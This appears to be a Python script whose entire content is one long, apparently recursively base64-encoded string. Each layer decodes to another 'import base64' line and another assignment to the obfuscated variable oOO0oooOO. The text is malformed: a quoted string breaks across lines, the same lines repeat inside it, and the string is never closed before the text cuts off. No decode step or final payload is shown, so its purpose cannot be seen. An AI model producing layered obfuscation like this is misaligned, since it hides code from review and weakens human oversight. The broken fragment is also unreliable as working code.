import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVTFoc1FtUkZkSEJOUjJSYVRXcHNjbGxXWXpGaWF6bHdVV3BHYTFJeGJEQlVNRTVDWkVWMGNFMUZkRXBsVlVsNVdWWmpkMDVzY0ZsaFNHUmFWbnBXY2xwRlpFZGhWVGwxVkc1U1dsZEZiM2RaVm1NeFlURndXRTVVUWxCaWJFcHZWMWMxVDAxSFNYcFJWR3hQVWtoQ05sbHFTbUZOUjFKSVVtMXNhazB4U2pKWk1GRjNUVVU1ZFZSdE9XaFdNVzkzV2tSS2MyRXlVa2hhZW14UFVrYzVURmxXWTNoa01rbDZVMnBDU2xJemFESlhha3ByWTBkS2RGa3dkR2hXZWtZeldXcE9TMDFGYkVoUFdIQkVZbGQ0TUZrd1l6VmxWMUpFVVdwT1lWZEZjSGxhVnpGWFRWWndNMk5ITVdwaVZHd3dVMVZvUzJGSFNuUlZibHBwVlRCS2QxbHNhRU5rYlU1MVZWZGthbUpWV2pGWGEyaExZVWRLZEZwSGVFUmlWbkExV1dwSmQxb3hjRWhTYWtKaFYwWktkMWxzWkZaYU1rWllUVmhrYVUwd2IzZFRWV1JUWVVkU1NGWnFRbWhXZWtaelVUSXhZV1ZYU1hsTlIyUmhVakJaZDFkc2FGZE5SMFpZWkROV2FtSldXbnBYVm1oVFkwZFNkRlp0ZEdGV00yZDNWMVpPUTJOSFNsbFJibHBxWW14R2Jsa3lNVmRqTVd4WlZXNUNhMkpXV25KWGJHUTBUVVpzVW1OSVFtbFhSVW95V1RJMVVsb3lTWHBSYlhocFlsWmFOVmt3Um5kaVYwNTBUMWhTU2xKNmJETlhiR014WWtkT2RWRllWbWxOTURSNVUxVmtjMlJIVGtoUFdHeHJVVEJLZEZsV1pGZGpNWEJKVkZoT1NsSjZiRFphUjJSM1lsZE9kRTlZVWtwU2Vtd3pWMnhqTVdKSFRuVlJWMlJvVm5wR00xbHFUa3ROUld4SVVtNWthRlV6Wkc1WFNHUjNZbGRPZEU5WVVrcFNlbXd6VjJ4ak1XSkhUblZSVjJSb1ZucEdNMWxxVGt0TlJXeEhWR3hhVmxKV1dsUldiRnBQVW14V2MwOVZjRk5SV0VKMFdUSXdOV1JGYkVoUFdHUmhWbnBXYzFreU5VSmtWMFpKVldwQ2FsRXdTbmRaYkdoRFpHMU9kVlZYWkdwaVZsbzBXa1prVjJWdFVrSmpSekZxWWxSc01GTlZZelZrTVhCWVRsZDRhbUpyUmpGWGJHaHZZV3h3V1ZGcVFtaFdlbXd4V1ROc1EyTkhTbGxSYmxwcVlteEdibFpzYUU5aVIwNXlWbTVzYW1KVWJEVlJNakZoWlZkSmVVMUhaR2xOTUVweldXMHhWMlZYVGtST1YyaGhVakZLTWxsdE5VNWtWMDE1VW0xd2FtSlZXbTFYYTJSWFpFZEtOVTVZVW1sTmJFcHpXV3RvVGxveVJsaE5XR1JwVFRCdmQxTlZaRTlrYlVwWlZtNVdZVmRGTVV4Uk1uYzFZekpKZVZwSE5XRlhSV3h1VlVaT1EyTXlTWGxhUnpWb1ZucFdkVlJITVd0aVIxSkdaVWhhWVUxdFVuTlpNbXh2V214bmVVNVhhR2xXTVZwdFYwaHNjbE13VG5SVmJYaGhZVlZLZFZkc1l6RmlSMDUwVW01c1dsWnFiREJhUm1NeFpXeHdWR0ZJY0dGV00yaDBWRVZrVDJSc2NFaGlSelZwVFZSc2IxbHROVkpqTVd0NVQxZDBhRll5VWpKWFJFcEhZVzFTUkdGNldrUmhWVVp1VTFWT1EyRkhUblZUVjJSUlZUQktObHBGYUVwaU1XdDVUMWQwYUZZeVVqSlhSRXBIWkZkU1JHRXpWbXBOTUVwNldWWm9VbUl3Y0RWVlZ6Vk1WVmM1YmxOVlRrSmFNV3haVTI1c1RsVXdSVFZUVldoUFRVZE9jR0ZIY0dsTmJFcDNWMnBKTlZwc2JGaFVha0pNVlhwV05sa3daRFJqUjFKRVdqSTFTMUV5VG5kUk1teENXakJzUkZGdVFtRmhWVXA2VjJ4ak1HSXhiRmxUYm14T1ZUSjBibFZIYkVKTlJUbHVZakprU2xFd1JtNVRWVTVDV2pCc1NWZHRhRXBTUkVKdVYxWm9TMlZWTVZkamVrSlpWVmM1YmxOVlRrSmFNR3hFVVZka1NsTkZOVzlaYTA1Q1QxVnNTVmR0YUZobGJUazJWMFpHZGxvd2JFUlJWMlJLVVRCR2JsTlZaRTlrYlVwd1VWUnNTbEpGVmt4VFZVNUNXakJzUkZGWFpFcFJNRXAzVjIxc1EyTXhjRmhPUnpsYVYwVndOVk14VGtKTE1HeEZWVlJhUkdGVlJtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVmtUMlJ0U25CUlZHeEtVako0TVZwRlRtOWhSMDUxVTIxS1QxSnFSbWxVVkVWM1kwVjBObEpWZEVwUk1FWnVVMVZPUWxvd2JFUlJibkJhVmpOa2JsTXpiM2RhTWsxNlZXNXNURkl3TlRKWmJXeHlVekJzUkZGWFpFcFJNRVp1VTFWT1EyVnRVbGhOUjJSUlZUQktNbGt5TVZKaU1XdDVUMWQwYUZZeVVqSlhSRXBIWkZkU1IyUklRbWxpYkVaMldrY3hSMWxyTVVkTlNFSlpWVEowZVZscVRrdGhNSFJJVkc1YVlWSXllSFZaYWtVMVlVZEtkVlZ0U21oV2VsVjNVekJvWVdGR1pEWlNiVkpNVm1wQ2QxTjZTVFZsVm5CRVlVZHdhVTFzU25kWGFrazFXbXhzV0U1VVFsaE5iWGd4V2tWT2IwMXNiRmRqTTJ4WlZUSjRhMU14Um5aYU1HeEVVVmRrU2xFd1JtNVRWV2hQWVVkS1JGRllTbEZWTUVvMldrVm9TbUl5VFhwV2JsSk1WVmM1YmxOVlRrSmFNR3hFVVZka1NsSXllSFJUVldoaFlVVnNSVTFFYkVwVFJUVnZXV3RTZGxNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGthbUpXV1hkYVJtaExaRlZzUjFWdWJHdFdNVlpNVTFWT1Fsb3diRWxUYlhoclUwWmFOVmx0YkVOU01XeFlaVWh3WVZWWE9VeFhhMlJYWWxWc1NGSnVaR2xTTW5odFYydGtWMlZzYkhSbFNGcHFWMFphYzFkV1pGTmhSWFJKVkcxNGFWSXhiSHBYVkVrMVlUSkdXRnBJV2xsTmJGb3hXa1ZvUzJGR2NFaFNXRTVhVFdwc2NsbFdaR3RrYkdkNVZXMTRhazFyY0hwWmFrNUhUVlp3V0U5SVRtcE5hMXA2V2tWT2NrNXJUbkJSVjJSS1VUQktjVmxxU2xOalJuQndVVlJzU2xFeVRuVlJNbXhDV2pCc1JGRnRjR2xOYkVwM1YycEpOVnBzY0ZoT1ZFSktVa1JDYmxOdWJHcFRNR3hFVVZka1NsSXdOVEpYYTJSelltMUplRTlYZEdGWFJUVndXV3RqTldWSFVsaFdWMlJSVlRCR2RWTnVaSFphTUd4RVVWZGtXazFxYkhKWlZtUnJaR3huZVZadVZtdFRSWEJ2VjJ0a1JtVkZiRVZOUjJSYVRXcHNjbGxXWkd0a2JHZDVWbTVXYTFORmNHOVhhMlJIV1dzNWNWUlVRbGxWVnpsdVUxVk9RbG95UmxoWFYyUmFUV3BzY2xsV1pHdGtiR2Q1VlcxNGFrMXJjSHBaYWs1SFRWWndXRTlIWkZwV2VsWnlVMVZrVDJSc2NFaGlSelZwVFZSc2NsZHNhRTloVjBwSVQxaG9hMVl4V2pKVVJ6RlBaRzFTV0U1VVFreFJNazV5VTI1c2Nsb3hRbkJSV0d4UVdqSTVibE5WVGtKYU1HeEVVVmRrU2xJd1dqVlpNbXhDVDFWc1NWUnFRbXBoVjJoeFdXcEtVMk5HYjNsUFYxcGhVakZhTmxkWE1UUmtiVTVaVm0xNGFXVlhkREZaZWs1RFl6SkdXVlZYT1V0bFZrWjFVekZHZGxvd2JFUlJWMlJLVVRCR2JsTlZaRTlrYkhCSVlrYzFhVTFVYkhKWGJHaFBZVmRLU0U5WWFHdFdNVlp1VlVaT1EyRkhUblZUYlVwT1VtcENlVk51YkZKaWEzTjVVbTVzYW1KSVRqUlhSazU2WW10d1JGa3pTbHBYUlhBMVZqTndTMXBGZERWWk1uUkxaVmhTYjFreU5VdFphekI0VFVWMFNsRXdSbTVUVlU1Q1dqQnNSRkZ0ZUdsaVZUVTFXbFpvUTAxR2NGaFZWMlJSVlRCS2NWbHFTWGhOVjBwMFZtNXdUV0pXV2pGWFZFNUxUbGRPU1ZWdFdtbFdNVVY0VXpCT1EyRnRTWGxWYmtKaFRXcHNiVmRzWXpGTlIwNTBVbTEwV2xVelpHNVhWbWhMWlZaa05sTnRVa3hWVnpsdVUxVk9RbG93YkVSUlYyUktVakExTWxkclpITmlWV3hGVFVka1lWWjZWbkZaTWpWelpESlNTRlp0ZEUxaVZsb3hWMVJKTldFeGNGUmFNalZyVjBaS2RGUkdVbTVpYTNSU1lqSmtTbEV3Um01VFZVNUNXakJzU0ZSdVdtRlJNRVUxVTFWb1ZtRldSVFJVTTNCaFVqSjRkVmx1YkVOa1YwbzFVV3BLTTA1clducFpWbVJUWkd0c2NGRlZkRXBSTUVadVUxVk9RbG93YkVSUmJYQnBUV3hHYmxWR1RrTmtiVTQxVGxkNGFXSnNjSGRaTWpBMVpGWmtOVnBGVWxWTlJFWlNWbXhhVTFKc1ZuSk9WVXBWVmxaV2RWZEdSblphTUd4RVVWZGtTbEV3Um01VFZXTjRZVVpzTlZGVWJFcFNNRFV5V1d4b1YyUldjRmxVV0ZaaFRXeFpkMWRFU205aE1YQkhUMWh3WVZkRmNIZFhiRTV1WTBWT2NGRlhaRXBSTUVadVUxVk9RbG94YTNsUFYzUktVVE5OTlZOVmFFOU5SMDV3WVVoU1dsWXdNWGRSTW14Q1dqQnNSRkZYWkVwUk1FWnVWMnhqTVdGdFRuVmlTR1JyVWpGYWNsUldUa0pQVld4SVZHNWFhVmRHV2pGWGJHaE9aRlp3V0U1WGNHcGliWGd6V2tWWk5XUkdjRVZXVnpsS1VqQTFNbGRyVGpOYU1rMTVVbTVPYTFFeWRFeFRWVTVDV2pCc1JGRlhaRXBSTUVweFdXcEtVMk5HYjNsUFYxcGhWbnBWZDFWR1RrTmlSMHAwVkc1c2JGZEZTWGRYYkdSU1pVVjRkRlp1VmxwTmFteHlWMnhPYm1KdFVsbFZiVEZOVmtka2RWTXhSblpUTUd4RVVWZGtTbEl5ZUhSVFZXUlBaR3h3U0dKSE5XbE5WR3h5VjJ4b1QyRlhTa2hQV0doclZqRldibFZHVVhkYU1XdDVUMWQwYUZZeGJHNVhWbU14WVRCc1NGUnVXbUZTTW5oMVdXcEZOV0pIU25WVlZHeFJWakExTWxkclpITmliVWw0VDFkNGFXSnNTalZYVm1SVFlVVXhWRkZ0YUdsaVZrWnVWMVJKTldFeVJsaGFTRnBaVFd4YU1WcEZhRXRoUm5CSVVsZGtTbFpFUW01VGJteHFUbXRPY0ZGWFpFcFJNRVp1VTFWT1Fsb3lUblJXYWtKclYwVndNVk5WV2xObFYxSllWbFYwU2xFd1JtNVRWV1JYWXpKTmVWWlVXa1JoVlVadVUxVk9RbG93YkVSUlYyUnFZbFpaZDFwR2FFdGtWV3hHVjIxb2FWTkZOWE5STW1SMlV6RnJlV1ZIYUdwTk1ERnVXVEl4VjJWc1ozcFdibkJoVjBWd05sTXdZelZsYlZKd1RsaGFhazB4YkhkVU1tUjJXakJzUkZGWFpGbE5iWGd4V1ZWa1YyVlhSbGxWVjJSUlZUQkthVk5xVGt0aVIwNDFUbFJHYWsxc1dqVlpNMnhyV2tWT2JtSXlaRXBSTUVadVYydGtWMkpWYkVoYVIzaHJVbXBzY2xkV2FGTmtiVTE0VDFkMFlWWjZSakpUTUdoUFlrZEtTRmRZVGxwTk1HeDNWREprZGxvd2JFUlJWMlJLVVRCR2JsTlZhRTlsUjBwSFQxaHNZVmRGVm01VlJrNUNZVlpWZDFack1WTldWVFZXVTFWT2Rsb3hTbk5UYkVKVlZUQktObHBGWkVkbFYxSkhUMWQwWVZaNlJqSlVNMnhLVXpCc1JGRlhaRXBSTUVadVUxVk9RMkZ0VG5CT1YzaHNVakZhY1ZwR2FGTmlSWFJKVkc1b2FWSnFiRFZYYkdoR1kwVk9jRkZYWkVwUk1FWnVVMVZPUWxveGNFaFNha0pwVFRBeGJsVkdUa05oYlU1d1RsZDBhRll3TkhkWGJURlhUVVpyZVdGSVdtbGlWbFoyVXpGR2Rsb3diRVJSVjJSS1VUQkdibE5WWkhOaVZXeElUbGhhYTFFd1NuSlhWbWhUWkcxT05tSXdkRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxsNlNsZGpNWEJ3VGxoa2FVMXFiSHBVUnpGcllrZFNSRm95TldwTk1VcHZXVEkxVTFwc2NFaFdibEpwWlZkT2QxUkhNVTlsVm5CWVVtcENZVlV5YUhGWk1td3pXakpKZWxGdGVHbGlWbG8xV1RCTk1WWkdXbGRSYTFwV1lrWmFWVlZzV2t0YWJFNVdWVmhPU2xOSVVUVlRNVVoyV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUmFrSnFZbTF6TWxFeWJFSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FcHhXVEpyTVdGdFNYbE5XRkpvVjBaR2RsTXhSblphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdGVHeFNNRFZ6V1RCb1Vsb3hTbGxoUjNCaFYwVkpkMWxXWXpWa1ZUbHVZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG95VG5SV2FrSnJWMFZ3TVZkRVRsZGxWMHBFVVZSc1NsTkZjSE5aTVdoWFlrZE5lbFZZVm1oVFJrbDNXVEJvUzJKSFRsbFdiWGhxVFRGR01WcEdhRXRqTVdkNlUyNWFhVTB4Um01VGVrNVdZbTFSZVZadGJFMU5hMWw1V1Zab1QyUnJNVlJaTUhSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1NWcEhlR3BpV0ZFeVYyeG9WMkpyZUhSV2FsSmFUV3hhTTFwRlpITmtiVXAxVkZoV1dsWXdjREpaTWpWU1lqSlJlVlp1YkdoTk0wSnpXa1prYW1SWFVsbFZia0pwVTBVeE1Wa3lNVmRoTWtaWlUyMTRXazB4Um5aWk1qRlhUVWRTV1ZOdVZsbE5NVm8xV1d0T00xb3dNVFpSV0hCTVZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGcmVsTllWbUZYUjJoelYxUk9WMDFHY0ZSaFNIQnFWak5vYlZreU1WZGxSWFJTWWpKa1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FcHlWMVpvVTJSdFRqVlJWR3hLVWpBMU5WUkhNVk5qUm10NlZXMHhZVmRHU25GWlZXTTFaRlp3VkZvelFrUmhWVVp1VTFWT1Fsb3diRVJSVjJScVlsWlpkMXBHYUV0a1ZXeElWVzFvYTFKNmJEWlJNbVIyV2pCc1JGRlhaR0ZTTVZwMFUxVm9TMkpHY0VoaVNHeGhWakExY1ZsV1l6VmtWbXhaVTFjNWFrMXNXbnBYYld3eldqSlNXVk51VGt4V1J6bE1VMVZPUWxvd2JFUlJWMlJLVVRCS05WZHNhRk5OVjA1MFRsZGFhMWRGY0hwVFZWRjNXakpPZEZadWFHdFdNVm8yV2tWTk1XSXlVa2xWYm1ScVlsWmFORnBHWkZkbGJWSkVUbFJHYW1KWWFHMVpNakExWkcxU1JGRllTbXRYUlhCNlVUSnNRbG93YkVSUlYyUktVVEJHYmxwRVNsZGxWMFY2WTBkNGExWXlUakZYYkdodllXeHdXVkZxUW1oV2Vtd3hXVE5yTVdGR2JIUlBXR3hyVVRKbmVsZHNhRXRqYlZaMFZtcEdZV1ZVVlhoYVJXUnpZekpPTlU1WWJHRldNVXAzV1RJeFYyRnRVa1JoU0d4aFYwWkplRmt5TURGYWJWSlpVMjVPVFZFd1JqWlVWVkpPWTBWMFVtSXdkRXBSTUVadVUxVmtVMkpHY0hCUmJXaHJWMFpLZGxkc1l6Rk5SMFpZVkcxb2ExSXhWblpaZWtwWFl6RndjR1F5WkdGU01HeDZVMVZrTkdSc2IzbGlTRlpOVVRCS00xZFdhRTlsYlZGNVQxaHNZVkV6Wkc1YVJtaFBZa2RPYzA5WGFHRk5iRm94V2tWWk5XSkhTblZYV0VKUVdqSTVibE5WVGtKYU1HeEVVVmRrU2xJd05UVlRWVkYzV2pKTmVWWnVUbUZoVkZZeldXcEpOV013ZUhSVWFrWnFZbXMxTWxreWJHNWpSVTV3VVZka1NsRXdSbTVUVlU1Q1dqRndTRkpxUW1sTk1ERnVWVVpPUTJWc2NGaGxSekZOWWxkU2MxcEZXVFZoTVd4WlZXNWFhazFVYkhKWGJHTjRaR3QwU0ZSdWJFeFZWemxMVVRGb1EyVlhSbGhPVkVKS1VUQndWVmRXWkU5bFZteFVVVzEwWVZaNlJqSlRWV1JIVFZkU1NGWnVWbXRTTW5oeFYxWm9VMkpHY0ZoV2JYaGhWakZhYzFkc1pGZGlSbkJZVm0xNFlWWXhXbk5YYkdSWFlrWndXRlp0ZUdGVk1HeE1VMVZPUWxvd2JFUlJWMlJLVVRCS2QxZHRiRU5oTVd4WlZXNWFhbVZ0T1V4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3lUblJXYm5CclZrVldibFZHVGtObGJIQllaVWN4VFdKclNqSlpha296WkZadmVWWnFRa3hSTWxKM1dUSnJNV0Z0U1hsT1Z6Rm9WakpTYlZrd1pFZGxWbXhZVFZkNGExSXhXalZUYm14eVpGZE5lVlp0YUdwaVZUVjJVekJrVDJWVmVFaFBXR1JoVm5wV2Mxa3lOVUprVmxWNFZteEdVMVpyY0ZkV1ZFSlhWVEZuZDJKRlZrMVJNRXBwVXpCT2EyTnNjRmxoTWpWTlVUSk5OVk51YkROaWJIQklVbXBDV2xZd2NHOVpla3BXWkZac1dGUnRjR0ZYUlRVMlZFY3hVMkpIU2xoUFJ6Vk1WbXBDZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNTVk50ZUdwTk1WWnVWVVpPUTJWc2NGaGxSekZOWW10S01sbHFTak5rVm05NVZtcENURkV5VW5kWk1tc3hZVzFKZVU1WE1XaFdNbEp0V1RCa1IyVldiRmhOVjNoclVqRmFOVk51YkhKa1YwMTVWbTFvYW1KVk5YWlRNR1JQWlZWNFNFOVlaR0ZXZWxaeldUSTFRbVJXVlhoV2JFWlRWbXR3VjFaVVFsZFZNV2QzWWtWV1RWRXdTbWxUTUU1clkyeHdXV0V5TlUxUk1rMDFVMjVzTTJKc2NFaFNha0phVmpCd2IxbDZTbFprVm14WVZHMXdZVmRGTlRaVVJ6RXdZa2RXVkZrelFsbFZNblJNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1rWllWMWRrYVdKVWEzZFRWV2hMWWtkTmVsWllhRXBTZW13MVUxVmpNV1J0VWtSUmJteGhWMFUwZUZReVpIWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVXWHBLVjJNeGNIQk9XR3hoVmpGS2Qxa3lNVmRoYkd0NVlraGFhV0pWV2pWVE1HaFdZbTFSZVZadGJFMU5hMWw1V1Zab1QyUnJNVlJaTTBKRVdqSTVibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVEWTFkSmVWTnRXbWhXTVVadVZVWk9RMlZzY0ZobFJ6Rk5ZbXRLTWxscVNqTmtWbTk1Vm1wQ1RGRXlVbmRaTW1zeFlXMU9kRTlZVmt0bFYzUXhXWHBLVjJGSFRuUlViVGxNVWpBMU5WUkZUa05rYlU1SVZtNVdZVmRGY0ROVVIzaFBWbXhXUmxac1RsZFdhelZIVmxkM05WTnNTa1JrTW1SWVpWZGtkVmx0TVVka1JuQlVXVE5PUzJWcVFuVlVSVTVyVlZkT2RFOVhOV3BpVlZvd1YxWmtUMk5IU1hsT1IyUmhVakZhTUZsdWJHcGpSbWhVWVRKa1NsRXdSbTVSTW1SMldqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJia0poWVZWS2NsZFdhRk5rYlUxNFl6STFXazFxYkhKWlZtUnJaR3huZVZadVZtdFRSWEJ2VjJ0a1JtSnNhRlJSVkd4UlZUQktlbGxxU210alIwcHhZakIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVoaVJ6RktVak5vYzFsdGJHOWxiVkpKVTFjNWFsSXdXalpaZWs1clpHMU9kRlZZUWsxaWF6VXpXV3RrYzAxRmRFUlpNblJMWlZkMGQxTlZVVEJhTURWRllqQjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQktkMWR0YkVOaWJIQllUbGQ0YW1KVldqVlhWbGsxWkVkU1dFNVljR0ZWTW1nMlYyeGtOR0pWZUVSUmJYUmFWMFpLTWxsNlJucGliR3Q1VDFkMGFGWXlVakpYUkVwWFpGZFNTVk50YUdGU01GWjFWMFpPTTFveVRraFNibkJxVFRKU01sa3lNVkpqUlRsdVlqSmtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtObFZteFVVVlJzU2xORmNHOVpiVEZUWlZac1dFNVhOV0ZWTW1RMFZFVlNjbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZvUzJGRk1WUlJWR3hLVTBWd2IxbHRNVk5sVm14WVRsYzFZVlV5WkRSVVJWSnlZMFZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWV1JQWkcxS2NGRlViRXBTUlZadVV6SnNRMlZXYkZKaU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJGdFNYbE9SMlJSVlRCS05scEZhRXBpTWs1MFVsaG9URlV6VWpaYVJXaEtZakZyZVU5WVZreFZNMUkyV2tWb1NtSXlUblJTV0VKRVlWVkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVsVWJtaHBVbXBzTlZkc2FFWmFNVUpVVVZkc1YxWnJTa1pWVmxwVFVtdHNTVlJxUWxwWFJXOTNWMFJLVTJKSFNsaFBSMlJXVFVaYVZsTlZaRTlrYkhCSVlrYzFhVTFVYkhOWmJUVlRaVlpzV0ZWdGFGRlZNazV3VTNwT1EyRkhUWHBVYWs1cFRUQndjbE16YkVwaWEzaElWRzVhYVdKc1NtOVZSazVLWTJ4cmVVOVlWa3hsVld4dVZtcENiMUpzVm5KV1YyUm9WakZGTlZOWGJEQmxiVkpKVTFjNVlWSXdXWGRaYWs1UFdXdHZlV0pIZEV0TlZFSjNVek5zU2s0d2JHNWlNbVJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1EyRnRUbkJPVjNoc1VqRmFjVnBHYUZOaVJYUkpWRzVvYVZKcWJEVlhiR2hHWTBWT2NGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVldSUFpWVjRkRlJ1V21sV2VrWjNXa1ZPYm1ORlRuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWb1QySkhTa2hYV0ZacVVucHNNbGxyVFRGaWJIQlpWVmM1UzAxdGVEVlVSekZQWkcxS2RGZHVRbUZOVkd3elYxWm9TMkZIU2xoV2FrSmhWMFZzZFZNeFRURmxiSEJaVlcxYWFsSXdXalZYVm1OM1lqRnJlbE5ZVGtwU2Vtd3pWMnhqTVdKSFRuVlJXRlpXVFZaYVVsVnNXa3RXYkZWM1ZteE9XVTFIZUVaVVJVNUNZbXh3U0ZKcVFscFdNSEJ2V1hwS1ZtUldiRmhVYlhCaFYwVTFObFJITVZOaVIwcFlUMGMxVFZFd1NuRlpha2w0VFZkS2RGWnVjRTFpVjFKeldXMTNOV05zY0ZsaE1qbEtVbnBWZUZsc1VYZGlhelZ3V1ROQ1RGVlhPVzVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXMXdhbUZVVm5GWmFrbDRaRWRHV1ZWWE9VeFZWemx1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRnVjR0ZXTTJoMFZFYzFTMkpHY0VoaVNHeGhWakExY1ZsV1l6VmtWbXhaVTFjNWExVXlVWHBYYkdSS1pHeHNXVmR1UW1wTmFtZDNVMjVzY2xNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdGVHbFRSVFZ6VkRKa2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVvMlYyeGtOR0pWZUhWVGJYaGhVako0TlZkc1pFOWhiVVpZVDFoV1dsZEZiSFphUms1clRURndXRk5ZV2xwWFJuQjNXWHBKTkUxVmNEVmhNSFJFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdVFtRmhWVXB2V1RCa05HTkdaM2xWYlhocVRXdHdlbGxxVGtkTlZuQllVbTEwV2xVeWFEWlhiR1EwWWxWNFJGRnVUbWxOYlZKM1dXMXNNMW95VGtoU2JuQnFUVEpTTWxreU1WSmpNR3hJVlcxb2ExSjZiRFpXTTJ4clpXeHNXR1ZFUWt0TlZFSjNWREprZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzU1ZSdWFHbFNhbXcxVjJ4b1Jsb3hRbFJSVjJ4WFZtdEtSbFZXV2xOU2EyeEpWR3BDV2xkRmIzZFhSRXBUWWtkS1dFOUhaRlpOUmxwV1UxVmtUMlJzY0VoaVJ6VnBUVlJzY2xkc2FFOWhWMHBJVDFob2ExWXhXakpWUms1cVlWVnplbEZ0YUdwTk1EUjZXV3BPUzJFd2REVlRWelZLVW0xU1NsVnNXa3RTYTJ4SVlrZDBVVlV3YkhsWmVrNVRaVlYwU0ZWdGFHdFNlbXcyVmpOc2EyTkdjRVJhUjFKTVZUTk9jRlF6YkVwVE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUmJYQnFZVlJXYzFwVlpGZGhiVkpaVlcxNFRGTkZOVFJaYTFrMVpWWndXVkpZUWtSaFZVWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WFZFNUtaRlpyZVU5WVVtbFdNbmQzVXpCT2NsTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRnVjR0ZXTTJoMFZFYzFRMlJ0U1hsa00xWmhUV3haZDFNd1RtdGpSMDV3VGxkd2FVMXFWblJaVm1ScldtMU9TRkp1YkZwV2VrWnpXa1ZrVjJWVmNEVmhNMVpxVFd4WmQxZEVUa05oUjA1MFVtNVNURkl3TlRWVVJVNURaRzFPU0ZadVZtRlhSWEF6VkVkNFQxWnNWa1pXYkU1WFZtczFSMVpYZHpWVGJFcEVaREprUzAxc1NtOWFSV1JIWVZac1dWUnRlRTFpVlZweFYxUktWMlZ0VGpWT1YzUmhWbnBHTWxOdWJETmFNV3Q1VDFoU2ExWjZWbk5aTTJzeFlteHdXRTVYV21oTmJGa3hVekJPUTJSWFVsaE5SR3hMWld4V2RWTXhUbkpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYlhCcVlWUldjVmxxU1hoa1IwWlpWVmM1VEZWWE9XNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlpITmlWV3hJWTBoYVdtSkViSGRYYTFKMlV6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WmVrcFhZekZ3Y0U1WVpHbE5hbXg2VkVjeGEySkhVa1JhTWpWb1YwVnNNVmRVVGt0a2JVcHdXVE5DVFdKdFVqVlpWbWhUWWtWMFNGUnViRTFSTUVveVdUQmtWMlJXY0ZsVGJtUk5Za1UxVjFaVlZsZFZNVnBYVkd0YVZtSkViRXRWYTA0MFkxZEplVk50V21oV01VWjZVMVZvZW1Kc2JGaFVha0pvVjBad2MxTnVjSGRTTVd4WVpVaHdZVmRFUW5wVFZXUlBaRzFLZFZWdGVHeFRSa1UxVmtjd05XUldjRlJoTUhSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG94YTNwVFdGWmFUV3BzTUZsc1pITk5SWFJFWVRKa1NsRXdSbTVSTW14Q1dqQnNSRkZYWk